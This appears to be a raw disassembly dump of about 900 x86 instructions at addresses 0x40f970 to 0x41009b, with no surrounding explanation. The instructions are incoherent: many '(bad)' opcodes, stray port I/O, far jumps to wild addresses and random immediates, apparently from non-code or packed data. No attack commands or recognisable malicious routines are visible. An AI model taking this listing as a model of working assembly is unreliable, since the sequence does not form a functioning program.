  40f970:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f971:	adc    eax,0x6c329586
  40f976:	mov    esi,0x1eb1bce5
  40f97b:	popa   
  40f97c:	mov    cl,0x9c
  40f97e:	int    0x18
  40f980:	out    0xaf,al
  40f982:	push   0xff1f3c34
  40f987:	dec    ebx
  40f988:	shl    DWORD PTR [eax-0x7d],0x9f
  40f98c:	mov    ch,0xd4
  40f98e:	jbe    0x40f916
  40f990:	gs jecxz 0x40f938
  40f993:	xor    dl,dl
  40f995:	and    cl,BYTE PTR [ecx-0x55]
  40f998:	push   esi
  40f999:	popa   
  40f99a:	mov    al,0x65
  40f99c:	cmp    DWORD PTR [ebp-0x5c],ebp
  40f99f:	enter  0x1f92,0x42
  40f9a3:	or     al,0xfc
  40f9a5:	stc    
  40f9a6:	pop    ecx
  40f9a7:	adc    eax,0xa5240c7b
  40f9ac:	fisttp QWORD PTR [eax-0x4eb255c0]
  40f9b2:	inc    ebx
  40f9b3:	scas   eax,DWORD PTR es:[edi]
  40f9b4:	mov    ah,0x2b
  40f9b6:	mov    edx,0xf054fe
  40f9bb:	jo     0x40f944
  40f9bd:	add    esp,0x8395d23e
  40f9c3:	cli    
  40f9c4:	mov    bl,0xf1
  40f9c6:	adc    al,0x24
  40f9c8:	ins    DWORD PTR es:[edi],dx
  40f9c9:	mov    es,WORD PTR [ebp+0x29]
  40f9cc:	fs xor bh,0xfd
  40f9d0:	bound  di,DWORD PTR [edx+eax*1-0x6cdfa87c]
  40f9d8:	fisttp WORD PTR [ebx+edx*4+0x16]
  40f9dc:	adc    BYTE PTR [edi-0x35],bl
  40f9df:	mov    ecx,0x1a6c2176
  40f9e4:	xchg   ecx,eax
  40f9e5:	in     al,0xf4
  40f9e7:	clc    
  40f9e8:	stos   DWORD PTR es:[edi],eax
  40f9e9:	mov    cs,WORD PTR [edi+esi*8]
  40f9ec:	sbb    DWORD PTR [ecx+0x4f8df535],ecx
  40f9f2:	nop
  40f9f3:	rol    BYTE PTR [ebp-0x695a8468],0xad
  40f9fa:	sub    BYTE PTR [ebp+0x3a465cd0],0xc5
  40fa01:	(bad)  
  40fa02:	fstp   QWORD PTR ds:0x88717409
  40fa08:	adc    ch,dl
  40fa0a:	mov    edx,0xd2c1eaf6
  40fa0f:	push   ecx
  40fa10:	out    dx,eax
  40fa11:	dec    ebx
  40fa12:	xchg   ebx,eax
  40fa13:	test   al,0xad
  40fa15:	jmp    0x40fa66
  40fa17:	pusha  
  40fa18:	pop    eax
  40fa19:	xchg   edx,eax
  40fa1a:	cmovbe esi,DWORD PTR [eax-0x6db2c87b]
  40fa21:	aam    0xa6
  40fa23:	or     al,0x48
  40fa25:	lds    ebx,FWORD PTR [ecx-0x6]
  40fa28:	lds    ebp,FWORD PTR [edx]
  40fa2a:	out    0xa3,al
  40fa2c:	dec    edi
  40fa2d:	clc    
  40fa2e:	aas    
  40fa2f:	mov    al,0xdc
  40fa31:	cdq    
  40fa32:	scas   eax,DWORD PTR es:[edi]
  40fa33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa34:	fst    QWORD PTR [ebp-0x28]
  40fa37:	daa    
  40fa38:	scas   al,BYTE PTR es:[edi]
  40fa39:	sbb    eax,0xa4e75df7
  40fa3e:	rcr    BYTE PTR [esp+ecx*1],0x6
  40fa42:	test   al,0xd0
  40fa44:	dec    edx
  40fa45:	js     0x40fa9f
  40fa47:	into   
  40fa48:	in     eax,0x41
  40fa4a:	jecxz  0x40fa9c
  40fa4c:	push   ebx
  40fa4d:	pxor   mm2,QWORD PTR [ecx]
  40fa50:	add    edx,ebx
  40fa52:	lahf   
  40fa53:	dec    edx
  40fa54:	sahf   
  40fa55:	and    DWORD PTR [edi],eax
  40fa57:	retf   
  40fa58:	scas   al,BYTE PTR es:[edi]
  40fa59:	ds push cs
  40fa5b:	push   esp
  40fa5c:	mov    ecx,0xa663adc4
  40fa61:	bound  edx,QWORD PTR [ebx]
  40fa63:	adc    al,0xa1
  40fa65:	sbb    dl,BYTE PTR [ebp-0x2e]
  40fa68:	jb     0x40fa2d
  40fa6a:	dec    esp
  40fa6b:	mov    ch,0xed
  40fa6d:	out    0x89,eax
  40fa6f:	loop   0x40fa20
  40fa71:	daa    
  40fa72:	stos   DWORD PTR es:[edi],eax
  40fa73:	pop    ds
  40fa74:	rcl    DWORD PTR [eax+0x74],1
  40fa77:	cwde   
  40fa78:	retf   0x1f02
  40fa7b:	xor    al,0xea
  40fa7d:	push   0x52
  40fa7f:	mov    ebx,ss
  40fa81:	push   ds
  40fa82:	dec    esi
  40fa83:	inc    esi
  40fa84:	jbe    0x40fa9f
  40fa86:	xchg   ebp,eax
  40fa87:	xor    edx,DWORD PTR [ebp+0x43039e31]
  40fa8d:	fucomip st,st(4)
  40fa8f:	and    DWORD PTR ds:0xa14963b7,0xc15a51b3
  40fa99:	(bad)  
  40fa9a:	jge    0x40faff
  40fa9c:	push   ebx
  40fa9d:	sti    
  40fa9e:	aad    0xcc
  40faa0:	jne    0x40fa30
  40faa2:	push   ecx
  40faa3:	outs   dx,DWORD PTR ds:[esi]
  40faa4:	cmp    al,bl
  40faa6:	out    0x90,eax
  40faa8:	inc    eax
  40faa9:	loope  0x40fa89
  40faab:	dec    DWORD PTR [ebx]
  40faad:	inc    ecx
  40faae:	loope  0x40fada
  40fab0:	sti    
  40fab1:	popf   
  40fab2:	nop
  40fab3:	loop   0x40facd
  40fab5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fab6:	lea    ebp,[esi+0x14]
  40fab9:	adc    dh,BYTE PTR [ecx]
  40fabb:	jmp    0x9364f77b
  40fac0:	sbb    DWORD PTR [eax-0xa],ebp
  40fac3:	neg    BYTE PTR [edi-0x1c73e18f]
  40fac9:	test   DWORD PTR [esi],ebp
  40facb:	jg     0x40fa88
  40facd:	push   edi
  40face:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40facf:	xor    DWORD PTR [ecx],ecx
  40fad1:	jle    0x40faf6
  40fad3:	push   ss
  40fad4:	xor    al,0x33
  40fad6:	lahf   
  40fad7:	inc    ecx
  40fad8:	js     0x40fb11
  40fada:	push   ss
  40fadb:	and    DWORD PTR [ecx-0x5f50b35c],eax
  40fae1:	inc    ecx
  40fae2:	(bad)  
  40fae3:	xchg   ebx,eax
  40fae4:	or     BYTE PTR [ebp-0x2e89d0],dh
  40faea:	out    0x30,eax
  40faec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40faed:	mov    al,ds:0x25caecc3
  40faf2:	fld    TBYTE PTR [ebx]
  40faf4:	mov    dh,0xf
  40faf6:	jae    0x40fb5a
  40faf8:	xchg   edx,eax
  40faf9:	lea    esi,[ecx-0x2f]
  40fafc:	xchg   ebx,eax
  40fafd:	or     eax,DWORD PTR [ecx-0xf1c585d]
  40fb03:	xchg   esi,eax
  40fb04:	mov    ebx,0x7bd2572c
  40fb09:	iret   
  40fb0a:	aas    
  40fb0b:	mov    BYTE PTR [esi-0x4b],bl
  40fb0e:	(bad)  
  40fb0f:	mov    esp,0x19c40dd6
  40fb14:	mov    es,esi
  40fb16:	mov    esi,0x5f14057d
  40fb1b:	std    
  40fb1c:	pop    ebx
  40fb1d:	les    eax,FWORD PTR [edi-0x1a]
  40fb20:	mov    esp,0x49635793
  40fb25:	xor    esp,DWORD PTR ds:0x548253b6
  40fb2b:	test   BYTE PTR [ecx-0x3ad2683d],al
  40fb31:	xor    al,0x1d
  40fb33:	retf   
  40fb34:	popa   
  40fb35:	pop    esp
  40fb36:	pop    es
  40fb37:	call   0x35521f0
  40fb3c:	inc    edx
  40fb3d:	sbb    eax,0x563dbc31
  40fb42:	mov    ah,al
  40fb44:	aas    
  40fb45:	mov    dh,0x85
  40fb47:	test   DWORD PTR [eax-0x62],esp
  40fb4a:	jmp    DWORD PTR [ebx+0x653b01ed]
  40fb50:	and    BYTE PTR es:[eax-0x5e],0x2
  40fb55:	jp     0x40fbce
  40fb57:	repnz push 0x2573ffc0
  40fb5d:	das    
  40fb5e:	inc    ecx
  40fb5f:	(bad)  
  40fb61:	ss push 0x28
  40fb64:	shr    DWORD PTR [ecx],0x82
  40fb67:	shr    DWORD PTR cs:[esp+0xcd4e404],1
  40fb6f:	sbb    dl,BYTE PTR [edi+0x5e43053b]
  40fb75:	cmp    al,0xb7
  40fb77:	aad    0x9e
  40fb79:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb7b:	xchg   ebx,eax
  40fb7c:	(bad)  
  40fb7e:	fxch   st(0)
  40fb80:	mov    ebx,0x597a46cf
  40fb85:	sbb    DWORD PTR [edi+0x55],edx
  40fb88:	mov    ebp,0x90ca486c
  40fb8d:	jns    0x40fb8d
  40fb8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb90:	clc    
  40fb91:	xchg   edx,eax
  40fb92:	imul   esp,DWORD PTR ds:[edi-0xaa51aeb],0xa7177129
  40fb9d:	push   edi
  40fb9e:	mov    DWORD PTR [ecx+0x3d4b90f4],ecx
  40fba4:	jp     0x40fbd5
  40fba6:	mov    ecx,0xc37a71b6
  40fbab:	or     al,0x8b
  40fbad:	stos   BYTE PTR es:[edi],al
  40fbae:	mov    ecx,0x843e74ea
  40fbb3:	and    ah,dl
  40fbb5:	and    DWORD PTR [edx],edx
  40fbb7:	pop    eax
  40fbb8:	aas    
  40fbb9:	dec    ebp
  40fbba:	add    BYTE PTR [ebp+0x29],ah
  40fbbd:	jo     0x40fb4f
  40fbbf:	sub    BYTE PTR [eax-0x127ab1e9],bl
  40fbc5:	je     0x40fbe5
  40fbc7:	ret    0xcbcc
  40fbca:	dec    ebx
  40fbcb:	lods   eax,DWORD PTR ds:[esi]
  40fbcc:	jg     0x40fbd0
  40fbce:	fist   WORD PTR [edx]
  40fbd0:	aad    0xc4
  40fbd2:	xor    al,0x62
  40fbd4:	aad    0x3a
  40fbd6:	retf   
  40fbd7:	stos   DWORD PTR es:[edi],eax
  40fbd8:	xchg   BYTE PTR [ebp+0x40],ch
  40fbdb:	and    ecx,esp
  40fbdd:	mov    eax,ebx
  40fbdf:	jo     0x40fbe6
  40fbe1:	sub    esp,DWORD PTR [eax-0x5a]
  40fbe4:	or     eax,0x9706dea1
  40fbe9:	neg    eax
  40fbeb:	inc    esi
  40fbec:	pop    es
  40fbed:	idiv   ah
  40fbef:	out    dx,eax
  40fbf0:	mov    ebp,0xd7a691ff
  40fbf5:	mov    esi,0xe0f40ca3
  40fbfa:	jmp    0x9ec8:0x934abcd4
  40fc01:	cmp    eax,0x3aaea120
  40fc06:	push   esp
  40fc07:	and    BYTE PTR [edx-0x2abba93a],ah
  40fc0d:	mov    ah,0x3f
  40fc0f:	inc    ecx
  40fc10:	lods   al,BYTE PTR ds:[esi]
  40fc11:	ret    0x1587
  40fc14:	fld    TBYTE PTR [edx]
  40fc16:	stos   DWORD PTR es:[edi],eax
  40fc17:	mov    dh,0x37
  40fc19:	ret    
  40fc1a:	adc    ecx,DWORD PTR [ecx]
  40fc1c:	sub    bl,dl
  40fc1e:	mov    al,ds:0xe6f97a4
  40fc23:	dec    esp
  40fc24:	lock cs inc esp
  40fc27:	xlat   BYTE PTR ds:[ebx]
  40fc28:	mov    ah,0xad
  40fc2a:	push   ss
  40fc2b:	inc    esi
  40fc2c:	into   
  40fc2d:	pop    ss
  40fc2e:	dec    eax
  40fc2f:	stos   BYTE PTR es:[edi],al
  40fc30:	js     0x40fc69
  40fc32:	jne    0x40fc2c
  40fc34:	xor    eax,0x335c69be
  40fc39:	push   ds
  40fc3a:	xor    edx,DWORD PTR [edx-0x5d181433]
  40fc40:	push   ebp
  40fc41:	aam    0x35
  40fc43:	push   esi
  40fc44:	add    DWORD PTR [edx-0x67],ebp
  40fc47:	cmp    BYTE PTR [edi],dl
  40fc49:	sub    eax,0xfeebdf80
  40fc4e:	jae    0x40fc1b
  40fc50:	aas    
  40fc51:	add    dh,dh
  40fc53:	xchg   ebp,eax
  40fc54:	cmp    al,0x61
  40fc56:	push   edx
  40fc57:	adc    edi,DWORD PTR [ebx]
  40fc59:	adc    eax,0x2ea0fe49
  40fc5e:	js     0x40fc53
  40fc60:	pop    ebp
  40fc61:	mov    ebp,0xff5f13ef
  40fc66:	mov    ebp,0xd3a08dd7
  40fc6b:	imul   eax,DWORD PTR [edx+0x48],0x4a
  40fc6f:	mov    edi,DWORD PTR [ebp+0x39]
  40fc72:	jo     0x40fc70
  40fc74:	mov    al,ds:0xef3a2c96
  40fc79:	xor    eax,0x6bb3790d
  40fc7e:	shl    BYTE PTR [edx-0x5c],0xd3
  40fc82:	xor    al,0x5d
  40fc84:	(bad)  
  40fc85:	mov    ebp,0xc9ab5f34
  40fc8a:	mov    dl,0xbf
  40fc8c:	cdq    
  40fc8d:	gs cs (bad) 
  40fc91:	and    ebx,DWORD PTR [edi+0x400591bd]
  40fc97:	out    dx,al
  40fc98:	mov    esp,0xd6591b57
  40fc9d:	adc    ebx,esi
  40fc9f:	adc    eax,DWORD PTR [esp+edi*8]
  40fca2:	push   edx
  40fca3:	(bad)  
  40fca4:	jge    0x40fcd0
  40fca6:	cmovno edi,DWORD PTR [edi]
  40fca9:	xchg   edx,eax
  40fcaa:	test   BYTE PTR [edi-0x33],cl
  40fcad:	aad    0x60
  40fcaf:	mov    edi,0xfe848b0c
  40fcb4:	pop    edi
  40fcb5:	(bad)  [edx+0x420593ac]
  40fcbb:	cmp    bl,ch
  40fcbd:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40fcbf:	push   cs
  40fcc0:	aad    0xec
  40fcc2:	pop    esi
  40fcc3:	aam    0xf9
  40fcc5:	ror    al,cl
  40fcc7:	xor    esi,DWORD PTR [ebp-0x20]
  40fcca:	(bad)  
  40fccb:	jmp    0x40fce3
  40fccd:	fistp  QWORD PTR [eax+0x3910611a]
  40fcd3:	xchg   edi,eax
  40fcd4:	mov    cs,WORD PTR [edx-0x4f]
  40fcd7:	xchg   ebp,eax
  40fcd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcd9:	int    0x47
  40fcdb:	(bad)  
  40fcdd:	pop    ebx
  40fcde:	(bad)  
  40fcdf:	adc    DWORD PTR [eax-0x37],ebx
  40fce2:	mov    ds:0x1c98c354,eax
  40fce7:	sub    al,0xd0
  40fce9:	imul   esp,esi,0x8e47b02f
  40fcef:	ret    
  40fcf0:	out    0x3e,al
  40fcf2:	xchg   ebx,eax
  40fcf3:	out    0xc6,eax
  40fcf5:	sub    eax,0xf9753e03
  40fcfa:	in     al,0x58
  40fcfc:	sti    
  40fcfd:	mov    bh,0xb4
  40fcff:	jg     0x40fd68
  40fd01:	pop    ebp
  40fd02:	cwde   
  40fd03:	and    ah,BYTE PTR [ebx]
  40fd05:	dec    edx
  40fd06:	and    ah,BYTE PTR [edx+0x62]
  40fd09:	and    ecx,eax
  40fd0b:	addr16 in eax,dx
  40fd0d:	inc    edx
  40fd0e:	xchg   ah,dl
  40fd10:	fwait
  40fd11:	inc    ebx
  40fd12:	repnz (bad) 
  40fd14:	xchg   ebp,eax
  40fd15:	je     0x40fd69
  40fd17:	push   0x52
  40fd19:	sar    DWORD PTR [eax+0x5d],1
  40fd1c:	pop    ebp
  40fd1d:	adc    DWORD PTR [ebx+0x6e2c3665],esi
  40fd23:	lods   eax,DWORD PTR ds:[esi]
  40fd24:	dec    ebp
  40fd25:	fcomi  st,st(7)
  40fd27:	dec    eax
  40fd28:	enter  0x50e3,0x9
  40fd2c:	outs   dx,BYTE PTR ds:[esi]
  40fd2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd2e:	lods   eax,DWORD PTR ds:[esi]
  40fd2f:	aaa    
  40fd30:	xor    DWORD PTR [edi],eax
  40fd32:	jge    0x40fcf0
  40fd34:	imul   edi,DWORD PTR [ebp-0x67],0xffffffe4
  40fd38:	fldenv [edx-0x2e]
  40fd3b:	and    esi,eax
  40fd3d:	xor    eax,DWORD PTR [edi-0x21]
  40fd40:	leave  
  40fd41:	out    0xb3,al
  40fd43:	cmc    
  40fd44:	inc    ebp
  40fd45:	and    al,0xd2
  40fd47:	push   0x287598fa
  40fd4c:	(bad)
  40fd50:	sbb    ah,BYTE PTR [ebx-0x5c]
  40fd53:	mov    DWORD PTR [eax+edx*4-0x65241374],ebx
  40fd5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd5b:	xor    edi,DWORD PTR [eax+ebp*4]
  40fd5e:	mov    bh,cl
  40fd60:	mov    esp,0xb33529b3
  40fd65:	push   esi
  40fd66:	(bad)  
  40fd67:	imul   DWORD PTR [eax+0x768a6d69]
  40fd6d:	fld    TBYTE PTR [edi+esi*4+0x55]
  40fd71:	push   es
  40fd72:	jmp    0x3745d6ab
  40fd77:	mov    eax,ds:0x5f457836
  40fd7c:	push   esp
  40fd7d:	mov    ds:0x4a213f7b,al
  40fd82:	jge    0x40fdfa
  40fd84:	pusha  
  40fd85:	inc    ebp
  40fd86:	pop    eax
  40fd87:	leave  
  40fd88:	pop    ss
  40fd89:	cld    
  40fd8a:	cmp    DWORD PTR [ebx+0x61bc5972],0x70ee365
  40fd94:	pop    esi
  40fd95:	jno    0x40fde9
  40fd97:	push   cs
  40fd98:	sbb    eax,0x7adc33a9
  40fd9d:	loopne 0x40fd9f
  40fd9f:	iret   
  40fda0:	repz ja 0x40fd2b
  40fda3:	xchg   ecx,eax
  40fda4:	push   edi
  40fda5:	shl    dh,cl
  40fda7:	std    
  40fda8:	push   ss
  40fda9:	leave  
  40fdaa:	xchg   edi,eax
  40fdab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fdac:	retf   0xa17d
  40fdaf:	into   
  40fdb0:	mov    ds:0xeedc412f,eax
  40fdb5:	data16 cmp BYTE PTR ds:[eax+edx*4+0x29],dh
  40fdbb:	popf   
  40fdbc:	mov    edi,esp
  40fdbe:	mov    bh,BYTE PTR [ebx-0x5af25150]
  40fdc4:	(bad)  
  40fdc5:	inc    esp
  40fdc6:	and    DWORD PTR [edi-0x51839fbc],0x65
  40fdcd:	fcom   QWORD PTR [edx+0x5a9b6643]
  40fdd3:	mov    ebx,0xcaacbf8a
  40fdd8:	mov    esi,edx
  40fdda:	cld    
  40fddb:	into   
  40fddc:	mov    ch,0xe1
  40fdde:	aaa    
  40fddf:	lea    ecx,[esi]
  40fde1:	pop    esi
  40fde2:	scas   al,BYTE PTR es:[edi]
  40fde3:	pop    es
  40fde4:	in     al,dx
  40fde5:	or     ch,0xc4
  40fde8:	cmc    
  40fde9:	mov    WORD PTR [esi],ds
  40fdeb:	push   eax
  40fdec:	push   ebx
  40fded:	mov    dh,0x8c
  40fdef:	shl    DWORD PTR [ebx-0x72],1
  40fdf2:	dec    edx
  40fdf3:	mov    edi,0xf55a8d08
  40fdf8:	sar    DWORD PTR [ebx+0x5407fae0],0x44
  40fdff:	inc    esi
  40fe00:	mov    esp,0xd4bb61d1
  40fe05:	xor    al,0x55
  40fe07:	fcmovnbe st,st(3)
  40fe09:	or     edx,DWORD PTR [edi+esi*2-0x7b]
  40fe0d:	mov    BYTE PTR gs:[ebp+0x40836b31],dl
  40fe14:	data16 jecxz 0x40fdbc
  40fe17:	stos   BYTE PTR es:[edi],al
  40fe18:	xchg   edi,eax
  40fe19:	adc    ebx,DWORD PTR [edx-0x2b]
  40fe1c:	jo     0x40fe1a
  40fe1e:	xchg   edx,eax
  40fe1f:	sar    BYTE PTR [edi-0x5ed1a388],1
  40fe25:	mov    ch,0x6
  40fe27:	(bad)  
  40fe28:	or     dh,ch
  40fe2a:	iret   
  40fe2b:	aas    
  40fe2c:	sub    al,BYTE PTR [edi]
  40fe2e:	in     al,0x47
  40fe30:	pop    ebp
  40fe31:	les    edx,FWORD PTR [ebp-0x58]
  40fe34:	xor    ch,BYTE PTR [eax+0x1a]
  40fe37:	mov    BYTE PTR [ebp-0x795e61c0],dh
  40fe3d:	lahf   
  40fe3e:	fild   DWORD PTR [esi-0x77523e1a]
  40fe44:	call   0x5a67:0xc9e892d4
  40fe4b:	fidivr DWORD PTR ds:0x95852023
  40fe51:	add    edi,eax
  40fe53:	push   ebx
  40fe54:	xchg   ebx,eax
  40fe55:	outs   dx,DWORD PTR ds:[esi]
  40fe56:	mov    ebp,0xe452ea23
  40fe5b:	push   es
  40fe5c:	fs out dx,al
  40fe5e:	outs   dx,DWORD PTR ds:[esi]
  40fe5f:	ins    DWORD PTR es:[edi],dx
  40fe60:	out    dx,eax
  40fe61:	pop    ss
  40fe62:	xchg   DWORD PTR [ecx-0xbab03d2],eax
  40fe68:	cmp    al,0xc0
  40fe6a:	sub    dl,BYTE PTR [edi+0x6b088c58]
  40fe70:	mov    dl,0xd6
  40fe72:	inc    DWORD PTR [edx+0x1c87e0bf]
  40fe78:	out    dx,eax
  40fe79:	pop    esi
  40fe7a:	inc    esi
  40fe7b:	in     al,0x9a
  40fe7d:	inc    ebp
  40fe7e:	cwde   
  40fe7f:	iret   
  40fe80:	int    0xd8
  40fe82:	ins    BYTE PTR es:[edi],dx
  40fe83:	jb     0x40fe45
  40fe85:	push   esp
  40fe86:	pushf  
  40fe87:	pop    es
  40fe88:	cmp    DWORD PTR [edx+0x24c51963],ebx
  40fe8e:	xchg   ecx,eax
  40fe8f:	sub    BYTE PTR [ebx-0x646248f0],0xab
  40fe96:	xlat   BYTE PTR ds:[ebx]
  40fe97:	or     BYTE PTR [ecx+0x124464c1],bl
  40fe9d:	xchg   esp,eax
  40fe9e:	xchg   ebp,eax
  40fe9f:	cmp    BYTE PTR [edi+0x42],0x8d
  40fea3:	inc    edi
  40fea4:	(bad)  
  40fea5:	cld    
  40fea6:	retf   
  40fea7:	pushf  
  40fea8:	out    dx,al
  40fea9:	or     esp,ebx
  40feab:	ficom  WORD PTR [edx]
  40fead:	add    BYTE PTR [eax-0x3f],dh
  40feb0:	sub    ebp,edx
  40feb2:	add    DWORD PTR ds:0xc919fe42,ebx
  40feb8:	cmp    al,0xfa
  40feba:	dec    esi
  40febb:	in     eax,0xbb
  40febd:	dec    esi
  40febe:	int3   
  40febf:	mov    bh,0xc0
  40fec1:	fld    TBYTE PTR [edx+0x3]
  40fec4:	js     0x40fec9
  40fec6:	in     eax,dx
  40fec7:	stos   DWORD PTR es:[edi],eax
  40fec8:	add    ecx,0x13
  40fecb:	seto   BYTE PTR [edx+0x795a5a7e]
  40fed2:	test   eax,0x2290ab42
  40fed7:	or     ah,cl
  40fed9:	sbb    DWORD PTR [eax],eax
  40fedb:	out    dx,eax
  40fedc:	push   esp
  40fedd:	xchg   esi,eax
  40fede:	jae    0x40feb0
  40fee0:	pop    edx
  40fee1:	jg     0x40fefd
  40fee3:	nop
  40fee4:	sbb    bl,BYTE PTR [ebx+0x2b560084]
  40feea:	jmp    0x96e501b5
  40feef:	iret   
  40fef0:	sub    eax,0x4b0f476a
  40fef5:	sub    eax,0x7bc05f52
  40fefa:	add    eax,0x5f1491e7
  40feff:	int    0x4a
  40ff01:	inc    ecx
  40ff02:	fdivr  QWORD PTR [ebx]
  40ff04:	shl    BYTE PTR [ebx+0x1],1
  40ff07:	imul   ebx,edx,0x2956428f
  40ff0d:	rcr    dh,cl
  40ff0f:	es and eax,0xa56ba87d
  40ff15:	sub    ecx,DWORD PTR [ecx-0x4]
  40ff18:	jne    0x40feb1
  40ff1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff1b:	pop    esi
  40ff1c:	test   DWORD PTR [edx],ebp
  40ff1e:	daa    
  40ff1f:	shr    BYTE PTR [ebp+0x62],0x93
  40ff23:	idiv   BYTE PTR [esi-0x52]
  40ff26:	(bad)  
  40ff27:	lahf   
  40ff28:	(bad)  
  40ff29:	scas   eax,DWORD PTR es:[edi]
  40ff2a:	sub    DWORD PTR [ebx],ebp
  40ff2c:	(bad)  
  40ff2d:	out    dx,eax
  40ff2e:	aad    0xd2
  40ff30:	sub    BYTE PTR [ecx+0x6b639ea4],cl
  40ff36:	in     eax,dx
  40ff37:	xlat   BYTE PTR ds:[ebx]
  40ff38:	outs   dx,DWORD PTR ds:[esi]
  40ff39:	dec    ebx
  40ff3a:	pushf  
  40ff3b:	popf   
  40ff3c:	aad    0xa7
  40ff3e:	in     al,0x1c
  40ff40:	push   esi
  40ff41:	jns    0x40ff02
  40ff43:	cmp    BYTE PTR [ecx+eiz*8],al
  40ff46:	sbb    esp,ebp
  40ff48:	mov    edi,0x12fc9a03
  40ff4d:	int3   
  40ff4e:	rol    DWORD PTR [esi+0x35],cl
  40ff51:	fidiv  WORD PTR [ebx]
  40ff53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff54:	rcl    DWORD PTR [ebp+0x7a],0xd
  40ff58:	lock sub al,0x29
  40ff5b:	or     edx,DWORD PTR [edx]
  40ff5d:	dec    ebx
  40ff5e:	xlat   BYTE PTR ds:[ebx]
  40ff5f:	(bad)  
  40ff60:	(bad)  
  40ff61:	mov    dl,0x87
  40ff63:	loope  0x40fee5
  40ff65:	adc    al,0xfa
  40ff67:	jbe    0x40ff9c
  40ff69:	push   ebx
  40ff6a:	mov    al,ds:0x2cfb592b
  40ff6f:	in     al,0x69
  40ff71:	in     al,dx
  40ff72:	sbb    eax,0xf7e0997a
  40ff77:	pushf  
  40ff78:	mov    BYTE PTR [edx-0x4],ah
  40ff7b:	inc    ebx
  40ff7c:	add    bh,BYTE PTR [esi+eiz*4-0x52]
  40ff80:	into   
  40ff81:	(bad)  
  40ff82:	push   esi
  40ff83:	out    0x5a,eax
  40ff85:	mov    ebp,0xfe666306
  40ff8a:	add    DWORD PTR [esi-0x43],ebp
  40ff8d:	mov    ch,0xb8
  40ff8f:	stos   BYTE PTR es:[edi],al
  40ff90:	pushf  
  40ff91:	jbe    0x410007
  40ff93:	mov    ah,0xf1
  40ff95:	cmp    ch,ah
  40ff97:	sub    bh,BYTE PTR ds:0x92e296f2
  40ff9d:	mov    ebx,0x262b3cb0
  40ffa2:	fisubr WORD PTR [esi+0x7c]
  40ffa5:	sahf   
  40ffa6:	clc    
  40ffa7:	adc    cl,BYTE PTR [esi-0x7d8cea91]
  40ffad:	sub    ecx,esi
  40ffaf:	sub    BYTE PTR [esi+0x28],dl
  40ffb2:	pop    ds
  40ffb3:	mov    esp,DWORD PTR ds:0x24898265
  40ffb9:	or     eax,0xe28eb6f0
  40ffbe:	sub    DWORD PTR [eax-0x10a6b2d2],0x34
  40ffc5:	lock sbb eax,0x261a0568
  40ffcb:	(bad)  
  40ffcc:	cmp    dh,BYTE PTR [eax]
  40ffce:	mov    dl,0xa2
  40ffd0:	xchg   ecx,eax
  40ffd1:	imul   esi,DWORD PTR [ecx-0x79ef2650],0x505f3645
  40ffdb:	mov    eax,ds:0xd4bbe947
  40ffe0:	lds    eax,FWORD PTR [edx+0x6b3b7d78]
  40ffe6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffe7:	and    esp,ebx
  40ffe9:	mov    BYTE PTR [eax-0xcdebf9f],0x3d
  40fff0:	loop   0x40ffda
  40fff2:	xor    ch,dl
  40fff4:	inc    esp
  40fff5:	or     cl,bh
  40fff7:	inc    edx
  40fff8:	add    ecx,DWORD PTR [eax-0x5912fa0b]
  40fffe:	call   0x5cab063a
  410003:	sahf   
  410004:	js     0x410007
  410006:	jg     0x40fff4
  410008:	lds    esi,FWORD PTR [esi+0x3]
  41000b:	mov    ecx,0x10dcd6fa
  410010:	daa    
  410011:	cwde   
  410012:	jbe    0x41002c
  410014:	sbb    eax,0xe45cf5e1
  410019:	sbb    ecx,DWORD PTR [esi-0x67]
  41001c:	fdiv   DWORD PTR [ebx+0x73]
  41001f:	xor    BYTE PTR [ecx-0x31],cl
  410022:	mov    al,0x41
  410024:	mov    cl,0xfd
  410026:	sub    al,0x80
  410028:	outs   dx,DWORD PTR ds:[esi]
  410029:	inc    esi
  41002a:	call   0x5c5c2f98
  41002f:	cmp    dh,ah
  410031:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410032:	retf   0x7bd
  410035:	ret    
  410036:	clc    
  410037:	adc    dl,ah
  410039:	jp     0xa08ecd4e
  41003f:	xchg   DWORD PTR [eax],edi
  410041:	add    eax,0xac200d2a
  410046:	xchg   edi,eax
  410047:	fstp   DWORD PTR [ebx-0x373af299]
  41004d:	push   0x689efa82
  410052:	pop    ss
  410053:	push   edx
  410054:	scas   eax,DWORD PTR es:[edi]
  410055:	xlat   BYTE PTR ds:[ebx]
  410056:	scas   eax,DWORD PTR es:[edi]
  410057:	gs cwde 
  410059:	arpl   WORD PTR [eax],di
  41005b:	es pop esi
  41005d:	mov    dl,0x7b
  41005f:	jns    0x410064
  410061:	xchg   bh,bh
  410063:	and    al,0xc
  410065:	shr    BYTE PTR [esi-0x5f1357f4],1
  41006b:	pusha  
  41006c:	in     eax,dx
  41006d:	push   ss
  41006e:	iret   
  41006f:	or     DWORD PTR ds:0xa4125346,edx
  410075:	int3   
  410076:	cli    
  410077:	dec    edi
  410078:	xor    DWORD PTR [esi-0x26],eax
  41007b:	pop    ds
  41007c:	adc    bl,cl
  41007e:	mov    bh,BYTE PTR [ebx-0x14]
  410081:	sbb    eax,edx
  410083:	cmc    
  410084:	or     DWORD PTR [edi],ebp
  410086:	sbb    BYTE PTR [esi],ah
  410088:	leave  
  410089:	mov    bl,0xdb
  41008b:	fiadd  WORD PTR [edi+0x617a6602]
  410091:	aaa    
  410092:	jg     0x410113
  410094:	pop    edx
  410095:	mov    ebp,0x3e045be3
  41009a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41009b:	inc    ebp
